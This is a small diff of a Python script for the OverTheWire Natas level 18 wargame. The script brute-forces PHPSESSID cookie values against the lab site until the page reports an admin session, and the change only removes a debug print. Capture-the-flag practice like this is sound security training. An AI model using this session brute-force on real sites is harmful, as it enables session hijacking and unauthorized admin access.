@@ -144,7 +144,6 @@ for id in range(1,640):
                payload = {"username": "aa", "password": "aa"}
                id=str(id)
                cookie={'PHPSESSID':''+id+''}
-               print cookie
                s=requests.post('http://natas18.natas.labs.overthewire.org/index.php',auth=auth,data=payload,cookies=cookie)
                if "You are an admin" in s.text:
                         print id
